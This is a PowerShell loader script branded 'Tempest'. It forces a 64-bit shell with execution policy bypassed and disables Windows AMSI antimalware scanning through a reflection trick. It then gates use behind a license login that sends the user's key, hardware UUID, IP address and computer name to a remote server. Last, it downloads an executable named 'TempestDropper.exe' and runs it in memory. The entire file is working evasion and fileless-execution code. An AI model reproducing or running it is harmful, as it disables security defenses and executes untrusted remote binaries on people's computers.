if (-not [Environment]::Is64BitProcess) {
    & "$env:SystemRoot\sysnative\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -File $MyInvocation.MyCommand.Path @args
    exit
}

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-HwId {
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
public class Smbios {
    [DllImport("kernel32.dll")]
    static extern uint GetSystemFirmwareTable(uint firmwareTableProviderSignature, uint firmwareTableID, byte[] pFirmwareTableBuffer, uint bufferSize);
    public static string GetUuid() {
        uint sz = GetSystemFirmwareTable(0x52534D42, 0, null, 0);
        if (sz == 0) return "unknown";
        byte[] buf = new byte[sz];
        uint got = GetSystemFirmwareTable(0x52534D42, 0, buf, sz);
        if (got == 0 || got < 9) return "unknown";
        uint off = 8;
        while (off + 4 < got) {
            byte type = buf[off];
            if (type == 0x7F) break;
            byte structLen = buf[off + 1];
            if (structLen < 4) { off++; continue; }
            if (type == 1 && structLen >= 24) {
                byte[] u = new byte[16];
                Array.Copy(buf, (int)off + 8, u, 0, 16);
                return string.Format("{0:X2}{1:X2}{2:X2}{3:X2}-{4:X2}{5:X2}-{6:X2}{7:X2}-{8:X2}{9:X2}-{10:X2}{11:X2}{12:X2}{13:X2}{14:X2}{15:X2}",
                    u[3], u[2], u[1], u[0], u[5], u[4], u[7], u[6], u[8], u[9], u[10], u[11], u[12], u[13], u[14], u[15]);
            }
            uint next = off + structLen;
            while (next < got - 1 && !(buf[next] == 0 && buf[next + 1] == 0)) next++;
            next += 2;
            off = next;
        }
        return "unknown";
    }
}
"@ -ErrorAction SilentlyContinue
        return [Smbios]::GetUuid()
    } catch { return "unknown" }
}

function Get-PcName { return $env:COMPUTERNAME }

function Get-Ip {
    try {
        $wc = New-Object System.Net.WebClient
        return $wc.DownloadString("https://api.ipify.org")
    } catch { return "unknown" }
}

function Show-LoginDialog {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Tempest"
    $form.Size = New-Object System.Drawing.Size(340,260)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::FromArgb(30,30,30)

    $lblUser = New-Object System.Windows.Forms.Label
    $lblUser.Text = "Username"
    $lblUser.ForeColor = [System.Drawing.Color]::White
    $lblUser.Location = New-Object System.Drawing.Point(20,20)
    $lblUser.Size = New-Object System.Drawing.Size(280,16)
    $form.Controls.Add($lblUser)

    $txtUser = New-Object System.Windows.Forms.TextBox
    $txtUser.Location = New-Object System.Drawing.Point(20,40)
    $txtUser.Size = New-Object System.Drawing.Size(280,24)
    $txtUser.BackColor = [System.Drawing.Color]::FromArgb(45,45,45)
    $txtUser.ForeColor = [System.Drawing.Color]::White
    $txtUser.BorderStyle = "FixedSingle"
    $form.Controls.Add($txtUser)

    $lblKey = New-Object System.Windows.Forms.Label
    $lblKey.Text = "Key"
    $lblKey.ForeColor = [System.Drawing.Color]::White
    $lblKey.Location = New-Object System.Drawing.Point(20,80)
    $lblKey.Size = New-Object System.Drawing.Size(280,16)
    $form.Controls.Add($lblKey)

    $txtKey = New-Object System.Windows.Forms.TextBox
    $txtKey.Location = New-Object System.Drawing.Point(20,100)
    $txtKey.Size = New-Object System.Drawing.Size(280,24)
    $txtKey.BackColor = [System.Drawing.Color]::FromArgb(45,45,45)
    $txtKey.ForeColor = [System.Drawing.Color]::White
    $txtKey.BorderStyle = "FixedSingle"
    $txtKey.UseSystemPasswordChar = $true
    $form.Controls.Add($txtKey)

    $lblStat = New-Object System.Windows.Forms.Label
    $lblStat.Text = ""
    $lblStat.ForeColor = [System.Drawing.Color]::White
    $lblStat.Location = New-Object System.Drawing.Point(20,140)
    $lblStat.Size = New-Object System.Drawing.Size(280,16)
    $lblStat.TextAlign = "MiddleCenter"
    $form.Controls.Add($lblStat)

    $btnLogin = New-Object System.Windows.Forms.Button
    $btnLogin.Text = "LOGIN"
    $btnLogin.Location = New-Object System.Drawing.Point(20,170)
    $btnLogin.Size = New-Object System.Drawing.Size(280,30)
    $btnLogin.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
    $btnLogin.ForeColor = [System.Drawing.Color]::White
    $btnLogin.FlatStyle = "Flat"
    $form.Controls.Add($btnLogin)

    $global:authOk = $false

    $btnLogin.Add_Click({
        if ($txtUser.Text -eq "" -or $txtKey.Text -eq "") {
            $lblStat.Text = "Fill username and key."
            return
        }
        $lblStat.Text = "Authenticating..."
        $btnLogin.Enabled = $false
        $form.Refresh()

        $hwid = Get-HwId
        $pc = Get-PcName
        $ip = Get-Ip
        $body = @{ username = $txtUser.Text; key = $txtKey.Text; hwid = $hwid; ip = $ip; pc_name = $pc } | ConvertTo-Json

        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
            $resp = $wc.UploadString("https://tempestkey-production.up.railway.app/login", "POST", $body)
            if ($resp -match '"status"\s*:\s*"VALID"') {
                $global:authOk = $true
                $form.Close()
            } else {
                $lblStat.Text = "Invalid credentials."
                $btnLogin.Enabled = $true
            }
        } catch {
            $lblStat.Text = "Connection error."
            $btnLogin.Enabled = $true
        }
    })

    $txtKey.Add_KeyDown({ if ($_.KeyCode -eq "Enter") { $btnLogin.PerformClick() } })
    $txtUser.Add_KeyDown({ if ($_.KeyCode -eq "Enter") { $txtKey.Focus() } })

    $form.ShowDialog() | Out-Null
    return $global:authOk
}

$loggedIn = Show-LoginDialog
if (-not $loggedIn) { exit }

$loaderDir = Join-Path $env:APPDATA "TempestLoader"
if (-not (Test-Path $loaderDir)) { New-Item -ItemType Directory -Path $loaderDir -Force | Out-Null }
$dropperPath = Join-Path $loaderDir "TempestDropper.exe"
if (-not (Test-Path $dropperPath)) {
    (New-Object Net.WebClient).DownloadFile('https://github.com/eduxfectoor/TempestLoader/raw/main/TempestDropper.exe', $dropperPath)
}
$bytes = [System.IO.File]::ReadAllBytes($dropperPath)
$asm = [Reflection.Assembly]::Load($bytes)
[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')
try { $asm.EntryPoint.Invoke($null, @()) } catch { try { $asm.EntryPoint.Invoke($null, $null) } catch {} }
